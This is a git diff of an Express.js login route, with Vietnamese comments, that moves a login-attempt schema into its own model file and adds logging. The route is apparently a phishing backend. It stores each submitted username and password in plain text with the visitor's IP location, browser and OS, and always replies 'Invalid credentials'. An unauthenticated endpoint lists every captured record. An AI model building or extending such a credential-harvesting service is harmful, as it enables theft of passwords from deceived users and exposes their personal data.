@@ -3,6 +3,7 @@ const mongoose = require("mongoose");
 const cors = require("cors");
 const dotenv = require("dotenv");
 const axios = require("axios");
+const LoginAttempt = require("../models/LoginAttempt");
 
 dotenv.config();
 
@@ -31,23 +32,6 @@ const connectDB = async () => {
 // Kết nối ngay khi server khởi động
 connectDB().catch(console.error);
 
-const loginAttemptSchema = new mongoose.Schema(
-  {
-    username: String,
-    password: String,
-    timestamp: { type: Date, default: Date.now },
-    ip: String,
-    country: String,
-    city: String,
-    timezone: String,
-    browser: String,
-    os: String,
-  },
-  { collection: "userattempts" }
-); // Chỉ định collection name
-
-const LoginAttempt = mongoose.model("LoginAttempt", loginAttemptSchema);
-
 // Middleware để lấy IP thực
 const getClientIp = (req) => {
   const forwardedFor = req.headers["x-forwarded-for"];
@@ -67,7 +51,6 @@ router.post("/login", async (req, res) => {
   console.log("Client IP:", ip);
 
   try {
-    // Lấy thông tin vị trí từ ipapi.co
     const locationResponse = await axios.get(`https://ipapi.co/${ip}/json/`);
     const locationData = locationResponse.data;
 
@@ -86,11 +69,12 @@ router.post("/login", async (req, res) => {
 
     console.log("Saving login attempt:", loginAttempt);
     const savedAttempt = await loginAttempt.save();
-    console.log("Saved login attempt:", savedAttempt);
+    console.log("Successfully saved login attempt:", savedAttempt);
 
     res.status(401).json({ message: "Invalid credentials" });
   } catch (error) {
-    console.error("Error saving login attempt:", error);
+    console.error("Error in login process:", error.message);
+    console.error("Full error:", error);
     res.status(500).json({ message: "Server error" });
   }
 });
@@ -98,8 +82,10 @@ router.post("/login", async (req, res) => {
 router.get("/login-attempts", async (req, res) => {
   try {
     const attempts = await LoginAttempt.find().sort({ timestamp: -1 });
+    console.log("Found login attempts:", attempts.length);
     res.json(attempts);
   } catch (error) {
+    console.error("Error fetching login attempts:", error);
     res.status(500).json({ message: "Error fetching login attempts" });
   }
 });
